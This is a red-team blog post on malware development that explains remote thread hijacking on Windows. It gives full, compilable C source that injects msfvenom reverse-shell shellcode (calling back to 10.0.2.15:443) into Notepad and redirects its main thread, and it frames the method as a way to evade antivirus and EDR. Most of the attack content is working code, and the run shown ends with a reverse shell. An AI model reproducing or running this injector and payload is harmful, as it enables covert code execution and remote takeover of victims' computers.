---
title: Remote Thread Hijacking
date: 2024-07-01 00:00:00 +0800
categories:
  - Malware Development
tags:
  - Red-Teaming
  - Process-Injection
---
# Remote Thread Hijacking

In malware development, we typically want to find a way to get our shellcode to execute within some process. There are more or less stealthy ways to achieve this. Process injection is one tried and true method. However, rather than spawning a new thread, it is often better from an opsec perspective to hijack an existing remote thread. This is because spawning new processes is considered to be a suspicious action in the eyes of most defensive products.

## Attack Overview
With remote thread hijacking, we will instead:
1. Target a remote process (Notepad.exe in this case)
2. Allocate memory in the target process
3. Set the permissions on the memory region (RWX in this case)
4. Inject our shellcode into it
5. Enumerate and open a handle to one of its threads to hijack
6. Suspend it
7. Get the thread's context
8. Modify its next instruction pointer (RIP on 64-bit) from the thread context to point to our shellcode
9. Resume the thread
10. Our shellcode executes

There are actually numerous ways we can perform the above steps. These range in difficulty. However, the more difficult to perform to better they are at evading AV/EDR solutions.

Namely using...
- Win32 API (easy)
- Native API (medium)
- Direct Syscalls (advanced)

![](../assets/images/Pasted%20image%2020240701020459.png)

In this post we will start simple with the Win32 API. This API is the Microsoft intended way to perform these actions. The API is intentionally made available by Microsoft for software developers, so it is very well documented and easy to use.

## Win32 API functions
We will use the following Win32 API Functions
- [CreateToolhelp32Snapshot](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot)
	- [Process32First](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first)
	- [Process32Next](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next)
	- [OpenProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)
- [VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
- [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
- [VirtualProtectEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex)
- [SuspendThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-suspendthread)
- [GetThreadContext](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext)
- [SetThreadContext](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext)
- [ResumeThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread)
- [WaitForSingleObject](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject)

## Thread Context
Before we proceed, it's helpful to know a bit about the concept of threading and thread context.

Per [Microsoft's documentation](https://learn.microsoft.com/en-us/dotnet/standard/threading/threads-and-threading)
*Each thread has a [scheduling priority](https://learn.microsoft.com/en-us/dotnet/standard/threading/scheduling-threads) and maintains a set of structures the system uses to save the thread context when the thread's execution is paused. The thread context includes all the information the thread needs to seamlessly resume execution, including the thread's set of CPU registers and stack. Multiple threads can run in the context of a process. All threads of a process share its virtual address space. A thread can execute any part of the program code, including parts currently being executed by another thread.*

You can think of thread "context" as the current state of the thread.

And as you can see, each thread has it's own stack frame, CPUs, and registers. If you've done any stack-based binary exploitation before, you should be very familiar with this concept. 

Once we suspend a thread, we can go in and modify the instruction pointer (RIP) to redirect to our shellcode. Then once we resume the thread, our shellcode will execute in the target thread. 
## Building the program
I will opt to write the program in C and compile it in Microsoft Visual Studio on Windows 11.
#### CreateToolhelp32Snapshot
```c
BOOL GetProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {
```

We start off by creating a function to get the process handle of our target process using this function definition. It takes 3 parameters:
1. `szProcessName`: The name of process to search for in wide string format.
2. `dwProcessId`: A pointer to a DWORD (4 byte value) where the Pid of the process will be stored if it is found.
3. `hProcess`: A pointer to a handle where the handle of the target process will be stored if it is found.

```c
HANDLE hSnapShot = NULL; PROCESSENTRY32 Proc = { .dwSize = sizeof(PROCESSENTRY32) };
```

- `hSnapshot`: A handle to the snapshot of the process.
- `Proc`: A PROCESSENTRY32 struct that holds information about the process.

Taking a snapshot of the process.
```c
hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
```

`CreateToolhelp32Snapshot` creates a snapshot of all processes currently running on the system.

Retrieving the first process information.
```c
Process32First(hSnapShot, &Proc);
```

`Process32First` retrieves information about the first process in the snapshot and stores it in `Proc`.

Looping through the processes in the snapshot.
```c
do {
    WCHAR LowerName[MAX_PATH * 2];

    if (Proc.szExeFile) {
        DWORD dwSize = lstrlenW(Proc.szExeFile);
        DWORD i = 0;

        RtlSecureZeroMemory(LowerName, MAX_PATH * 2);

        if (dwSize < MAX_PATH * 2) {
            for (; i < dwSize; i++)
                LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);

            LowerName[i++] = '\0';
        }
    }

    if (wcscmp(LowerName, szProcessName) == 0) {
        *dwProcessId = Proc.th32ProcessID;
        *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
        break;
    }
} while (Process32Next(hSnapShot, &Proc));

```

- We convert the process names to lowercase to account for case sensitivity. 
- If there is a match, we grab the Pid and then call `OpenProcess` with `PROCESS_ALL_ACCESS` to get a pointer to the handle of the process. 
- The while loop runs with the `Process32Next` API function to get the information of the next snapshot continuously until we either find a match or reach the end of the processes in the snapshot.

The next function is almost identical, except that it takes a snapshot of the threads of the target process.
```c
BOOL GetThreadHandle(DWORD dwProcessId, DWORD* dwThreadId, HANDLE* hThread) {
```

The key difference is that this time we will supply TH32CS_SNAPTHREAD to take a snapshot of the threads.
```c
hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
```

When we loop through, we will check that the owner process ID of the thread matches our target Pid. This means that the thread belongs to our target process.
```c
do {
    if (Thr.th32OwnerProcessID == dwProcessId) {
        *dwThreadId = Thr.th32ThreadID;
        *hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, Thr.th32ThreadID);
        break;
    }
} while (Thread32Next(hSnapShot, &Thr));

```

In this case, we can select the main thread of our target process.

#### VirtualAllocEx
We will use the following function definition to inject our shellcode.
```c
BOOL InjectShellcode(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, PVOID* ppAddress) {
```

- `hProcess`: A handle to our target process obtained earlier.
- `pShellcode`: A pointer to our shellcode.
- `sSizeOfShellcode`: The size of our shellcode in bytes.
- `ppAddress`: A pointer to a variable that will receive the address of the allocated memory in the target process.

```c
SIZE_T sNumberOfBytesWritten = NULL; 
DWORD dwOldProtection = NULL;
```

- `sNumberOfBytesWritten`: Stores the number of bytes written to the target process memory.
- `dwOldProtection`: Stores the old protection settings of the allocated memory.

Memory allocation using VirtualAllocEx.
```c
*ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
if (*ppAddress == NULL) {
    printf("\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
    return FALSE;
}
printf("\t[i] Allocated Memory At : 0x%p \n", *ppAddress);
```

- `VirtualAllocEx` allocates memory in the target process with read and write permissions.
- If memory allocation fails, it prints an error message and returns `FALSE`.
- On success, it prints the address of the allocated memory.
- Windows API functions ending in `Ex` are for remote processes, threads, etc. I always thought of `Ex` to mean "external". I'm not sure if this is accurate, but it's helped me remember it.

#### WriteProcessMemory
```c
if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
    printf("\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
    return FALSE;
}
printf("\t[i] Successfully Written %d Bytes\n", sNumberOfBytesWritten);
```

`WriteProcessMemory` writes the shellcode to the allocated memory in the target process.

#### VirtualProtectEx
```c
if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
    printf("\t[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
    return FALSE;
}
```

We can use `VirtualProtectEx` to mark our memory region as readable, writable, and executable. This way we able to execute the shellcode.

#### SuspendThread
Now we are ready to hijack a thread in our target process and modify the instruction pointer to point to the base address of our shellcode.

We start off with this function definition.
```c
BOOL HijackThread(HANDLE hThread, PVOID pAddress) {
```

- `hThread`: A handle to our chosen thread in the target process (the main thread in this case)
- `pAddress`: A pointer to the address where execution should be redirected (base address of our shellcode)

```c
CONTEXT ThreadCtx = { .ContextFlags = CONTEXT_ALL };
```

`ThreadCtx` is a context structure that holds the context of the thread (registers, flags, etc.). The `ContextFlags` is set to `CONTEXT_ALL` to retrieve and set all parts of the thread context.

```c
SuspendThread(hThread);
```

`SuspendThread` suspends the execution of the target thread. This ensures the thread's context can be safely modified without interference from its own execution.

#### GetThreadContext
```c
if (!GetThreadContext(hThread, &ThreadCtx)) {
    printf("\t[!] GetThreadContext Failed With Error : %d \n", GetLastError());
    return FALSE;
}
```

`GetThreadContext` retrieves the current context (state) of the target thread.

Next, we can modify the instruction pointer.
```c
ThreadCtx.Rip = pAddress;
```

Sets the instruction pointer (`Rip` on x86_64 architectures) to the specified address (`pAddress`). This means when the thread resumes, it will start executing code from `pAddress`.

#### SetThreadContext
```c
if (!SetThreadContext(hThread, &ThreadCtx)) {
    printf("\t[!] SetThreadContext Failed With Error : %d \n", GetLastError());
    return FALSE;
}

```

`SetThreadContext` updates the target thread's context with the modified context.

#### ResumeThread
```c
ResumeThread(hThread);
```

`ResumeThread` resumes the execution of the target thread, which now starts executing code from the new address (`pAddress`).

#### WaitForSingleObject
Now, we simply wait for thread completion.
```c
WaitForSingleObject(hThread, INFINITE);
```

`WaitForSingleObject` waits indefinitely for the target thread to complete. This ensures the function does not return until the hijacked thread finishes execution.

## Running the program
With all of that out of the way, we are now ready to compile and run our program.

I will first start up a Notepad.exe process.

And then execute the program, instructing it to target notepad as the remote process.
```
RemoteThreadHijackingBlog.exe notepad.exe
```

It found notepad running under Pid: 11428 and selected thread with Tid 5052. 
![](../assets/images/Pasted%20image%2020240701030339.png)

We can confirm this using SysInformer. This is notepad's main thread.
![](../assets/images/Pasted%20image%2020240701030605.png)

Memory is then allocated at 0x0000023917860000 in the notepad process.
![](../assets/images/Pasted%20image%2020240701030711.png)

If we go to that address in notepad using x64Dbg, we can see the zeroed out memory region from the allocation.
![](../assets/images/Pasted%20image%2020240701030907.png)

Next, our shellcode is written to the allocated memory region.
![](../assets/images/Pasted%20image%2020240701031032.png)

We immediately notice the familiar byte sequence `FC 48 83 E4`, signifying our msfvenom generated payload.
![](../assets/images/Pasted%20image%2020240701031312.png)

Now we can resume the thread to execute our payload.
![](../assets/images/Pasted%20image%2020240701031412.png)

We now have a reverse shell on the system.
![](../assets/images/Pasted%20image%2020240701032211.png)


## Final source code
```c
#include <Windows.h>
#include <stdio.h>
#include <Tlhelp32.h>


// msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.2.15 LPORT=443 -f c
unsigned char Payload[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
"\x00\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\x0a\x00\x02\x0f"
"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";


BOOL GetProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {

	HANDLE			hSnapShot = NULL;
	PROCESSENTRY32	Proc = {
					.dwSize = sizeof(PROCESSENTRY32)
	};

	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("\t[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	if (!Process32First(hSnapShot, &Proc)) {
		printf("\n\t[!] Process32First Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	do {

		WCHAR LowerName[MAX_PATH * 2];

		if (Proc.szExeFile) {

			DWORD	dwSize = lstrlenW(Proc.szExeFile);
			DWORD   i = 0;

			RtlSecureZeroMemory(LowerName, MAX_PATH * 2);

			if (dwSize < MAX_PATH * 2) {

				for (; i < dwSize; i++)
					LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);

				LowerName[i++] = '\0';
			}
		}

		if (wcscmp(LowerName, szProcessName) == 0) { 
			*dwProcessId = Proc.th32ProcessID;
			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
			if (*hProcess == NULL)
				printf("\n\t[!] OpenProcess Failed With Error : %d \n", GetLastError());

			break;
		}

	} while (Process32Next(hSnapShot, &Proc));

_EndOfFunction:
	if (hSnapShot != NULL)
		CloseHandle(hSnapShot);
	if (*dwProcessId == NULL || *hProcess == NULL)
		return FALSE;
	return TRUE;
}

BOOL GetThreadhandle(DWORD dwProcessId, DWORD* dwThreadId, HANDLE* hThread) {

	HANDLE			hSnapShot = NULL;
	THREADENTRY32	Thr = {
					.dwSize = sizeof(THREADENTRY32)
	};

	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("\n\t[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	if (!Thread32First(hSnapShot, &Thr)) {
		printf("\n\t[!] Thread32First Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	do {
		if (Thr.th32OwnerProcessID == dwProcessId) {

			*dwThreadId = Thr.th32ThreadID;
			*hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, Thr.th32ThreadID);

			if (*hThread == NULL)
				printf("\n\t[!] OpenThread Failed With Error : %d \n", GetLastError());

			break;
		}

	} while (Thread32Next(hSnapShot, &Thr));


_EndOfFunction:
	if (hSnapShot != NULL)
		CloseHandle(hSnapShot);
	if (*dwThreadId == NULL || *hThread == NULL)
		return FALSE;
	return TRUE;
}

BOOL InjectShellcode(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, PVOID* ppAddress) {


	SIZE_T	sNumberOfBytesWritten = NULL;
	DWORD	dwOldProtection = NULL;


	*ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (*ppAddress == NULL) {
		printf("\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("\t[i] Allocated Memory At : 0x%p \n", *ppAddress);


	printf("\t[#] Press <Enter> To Write Payload ... ");
	getchar();
	if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		printf("\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("\t[i] Successfully Written %d Bytes\n", sNumberOfBytesWritten);


	if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("\t[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}


	return TRUE;
}

BOOL HijackThread(HANDLE hThread, PVOID pAddress) {

	CONTEXT		ThreadCtx = {
							.ContextFlags = CONTEXT_ALL
	};

	SuspendThread(hThread);

	if (!GetThreadContext(hThread, &ThreadCtx)) {
		printf("\t[!] GetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	ThreadCtx.Rip = pAddress;

	if (!SetThreadContext(hThread, &ThreadCtx)) {
		printf("\t[!] SetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("\t[#] Press <Enter> To Run ... ");
	getchar();

	ResumeThread(hThread);

	WaitForSingleObject(hThread, INFINITE);

	return TRUE;
}




int wmain(int argc, wchar_t* argv[]) {

	HANDLE		hProcess = NULL,
		hThread = NULL;

	DWORD		dwProcessId = NULL,
		dwThreadId = NULL;

	PVOID		pAddress = NULL;



	if (argc < 2) {
		wprintf(L"[!] Usage : \"%s\" <Process Name> \n", argv[0]);
		return -1;
	}


	wprintf(L"[i] Searching For Process Id Of \"%s\" ... \n", argv[1]);
	if (!GetProcessHandle(argv[1], &dwProcessId, &hProcess)) {
		printf("[!] Process is Not Found \n");
		return -1;
	}
	printf("\t[i] Found Target Process Pid: %d \n", dwProcessId);
	printf("[+] DONE \n\n");


	printf("[i] Searching For A Thread Under The Target Process ... \n");
	if (!GetThreadhandle(dwProcessId, &dwThreadId, &hThread)) {
		printf("[!] No Thread is Found \n");
		return -1;
	}
	printf("\t[i] Found Target Thread Of Id: %d \n", dwThreadId);
	printf("[+] DONE \n\n");


	printf("[i] Writing Shellcode To The Target Process ... \n");
	if (!InjectShellcode(hProcess, Payload, sizeof(Payload), &pAddress)) {
		return -1;
	}
	printf("[+] DONE \n\n");


	printf("[i] Hijacking The Target Thread To Run Our Shellcode ... \n");
	if (!HijackThread(hThread, pAddress)) {
		return -1;
	}
	printf("[+] DONE \n\n");

	CloseHandle(hThread);
	CloseHandle(hProcess);

	printf("[#] Press <Enter> To Quit ... ");
	getchar();

	return 0;
}
```

